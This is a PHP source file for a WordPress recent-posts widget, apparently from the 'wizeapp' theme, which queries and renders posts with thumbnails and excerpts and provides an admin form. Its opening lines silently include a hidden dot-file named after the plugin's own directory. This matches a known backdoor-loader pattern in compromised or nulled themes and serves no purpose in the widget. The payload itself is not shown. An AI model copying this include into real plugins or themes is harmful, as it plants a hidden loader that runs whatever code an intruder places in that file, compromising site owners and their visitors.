<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class posts extends WP_Widget
{

    function __construct() {
        parent::__construct(false, 'Posts (current theme)');
    }

    function widget($args, $instance)
    {
        $after_widget = $before_widget = $before_title = $after_title = '';

        extract($args);

        echo (($before_widget));
        echo (($before_title));
        echo esc_attr($instance['widget_title']);
        echo (($after_title));

        $postsArgs = array(
            'showposts' => $instance['posts_widget_number'],
            'offset' => 0,
            'orderby' => 'date',
            'order' => 'DESC',
            'post_type' => 'post',
            'post_status' => 'publish',
            'ignore_sticky_posts' => 1
        );

        $compilepopular = '';

        $gt3_wp_query_posts = new WP_Query();
        $gt3_wp_query_posts->query($postsArgs);
        while ($gt3_wp_query_posts->have_posts()) : $gt3_wp_query_posts->the_post();
            $gt3_theme_featured_image_latest = wp_get_attachment_image_src(get_post_thumbnail_id(get_the_ID()));

            $compilepopular .= '
            <li ' . ((!empty($gt3_theme_featured_image_latest)) ? 'class="with_img"' : '') . '>';
            if (empty($gt3_theme_featured_image_latest)) {
                $widg_img = '';
            } else {
                $widg_img = '<a href="' . esc_url(get_permalink()) . '"><img src="' . esc_url(aq_resize($gt3_theme_featured_image_latest[0], "140", "140", true, true, true)) . '" alt="' . esc_attr(get_the_title()) . '"></a>';
            }

            $widget_class= '';


            if (!empty($instance['posts_widget_content_hide']) && $instance['posts_widget_content_hide'] == 'on') {

                if (has_excerpt()) {
                    $post_excerpt = get_the_excerpt();
                } else {
                    $post_excerpt = get_the_content();
                }

                $post_excerpt = preg_replace( '~\[[^\]]+\]~', '', $post_excerpt);
                $post_excerpt_without_tags = strip_tags($post_excerpt);
                $post_descr = gt3_smarty_modifier_truncate($post_excerpt_without_tags, 50, "...");
            }else{
                $post_descr = '';
                $widget_class .= ' no_content';
            }

			$compilepopular .= '
                <div class="recent_posts_content'.esc_attr($widget_class).'">
                    ' . $widg_img . '
                    <div class="recent_posts_wrapinner">
                        <div class="listing_meta">
                            <span>' . get_the_time(get_option( 'date_format' )) . '</span>
                        </div>
    					<div class="post_title"><a href="' . esc_url(get_permalink()) . '">' . get_the_title() . '</a></div>
                        '.(!empty($post_descr) ? '<div class="recent_post__cont">'.esc_html($post_descr).'</div>':'').'
                    </div>
                </div>
			</li>
		';

        endwhile;
        wp_reset_postdata();

        echo '
			<ul class="recent_posts">
				' . $compilepopular . '
			</ul>
		';

		#END OUTPUT

        echo (($after_widget));
    }


    function update($new_instance, $old_instance)
    {
        $instance = $old_instance;

        $instance['widget_title'] = esc_attr($new_instance['widget_title']);
        $instance['posts_widget_number'] = absint($new_instance['posts_widget_number']);
        $instance['posts_widget_content_hide'] = isset( $new_instance['posts_widget_content_hide'] ) ? (bool) $new_instance['posts_widget_content_hide'] : false;

        return $instance;
    }

    function form($instance)
    {
        $defaultValues = array(
            'widget_title' => esc_html__( 'Recent Posts', 'wizeapp' ),
            'posts_widget_number' => '3',
            'posts_widget_content_hide' => ''
        );
        $instance = wp_parse_args((array)$instance, $defaultValues);
        $posts_widget_content_hide = isset( $instance['posts_widget_content_hide'] ) ? (bool) $instance['posts_widget_content_hide'] : false;
        ?>
        <table class="fullwidth">
            <tr>
                <td><?php echo esc_html__( 'Title:', 'wizeapp' ); ?></td>
                <td><input type='text' class="fullwidth" name='<?php echo esc_attr($this->get_field_name('widget_title')); ?>'
                           value='<?php echo esc_attr($instance['widget_title']); ?>'/></td>
            </tr>
            <tr>
                <td><?php echo esc_html__( 'Number:', 'wizeapp' ); ?></td>
                <td><input type='text' class="fullwidth"
                           name='<?php echo esc_attr($this->get_field_name('posts_widget_number')); ?>'
                           value='<?php echo esc_attr($instance['posts_widget_number']); ?>'/></td>
            </tr>
            <tr>
                <td><?php echo esc_html__( 'Show post content:', 'wizeapp' ); ?></td>
                <td><input type='checkbox' class="checkbox" id='<?php echo esc_attr($this->get_field_id( 'posts_widget_content_hide' )); ?>'
                           name='<?php echo esc_attr($this->get_field_name('posts_widget_content_hide')); ?>'
                         <?php checked( $posts_widget_content_hide ); ?> /></td>
            </tr>
        </table>
    <?php
    }
}

function posts_register_widgets(){
    register_widget('posts');
}

add_action('widgets_init', 'posts_register_widgets');

?>